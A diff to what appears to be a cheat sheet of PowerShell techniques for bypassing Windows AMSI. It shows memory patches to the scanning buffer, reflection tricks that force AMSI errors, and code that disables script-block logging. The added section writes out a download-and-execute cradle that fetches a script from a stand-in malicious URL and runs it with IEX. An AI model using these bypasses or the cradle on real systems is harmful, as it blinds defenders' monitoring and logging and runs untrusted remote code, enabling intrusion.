@@ -31,13 +31,28 @@ $p = 0
 $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
 ```
-## 2) Forcing an error
+
+## 2) Dont use net webclient
+
+    $webreq = [System.Net.WebRequest]::Create(‘https://maliciousscripturl/malicious.ps1’)
+
+    $resp=$webreq.GetResponse()
+
+    $respstream=$resp.GetResponseStream()
+
+    $reader=[System.IO.StreamReader]::new($respstream)
+
+    $content=$reader.ReadToEnd()
+
+    IEX($content)
+
+## 3) Forcing an error
 ```
 $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
 
 [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
 ```
-## 3) Disable Script Logging
+## 4) Disable Script Logging
 ```
 $settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
 $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
@@ -47,7 +62,7 @@ $settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr
 [Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
 ```
 
-## 4) Amsi Buffer Patch - In memory 
+## 5) Amsi Buffer Patch - In memory 
 ```
 function Bypass-AMSI
 {
@@ -57,7 +72,7 @@ function Bypass-AMSI
     [Bypass.AMSI]::Patch()
 }
 ```
-## 5) Same as 4 but integer Bytes instead of Base64
+## 6) Same as 4 but integer Bytes instead of Base64
 
 ```
 function MyPatch{
@@ -72,7 +87,7 @@ MyPatch;
 Start-Sleep 1;
 ```
 
-## 6) Nishang all in one
+## 7) Nishang all in one
 ```
 function Invoke-AmsiBypass
 {
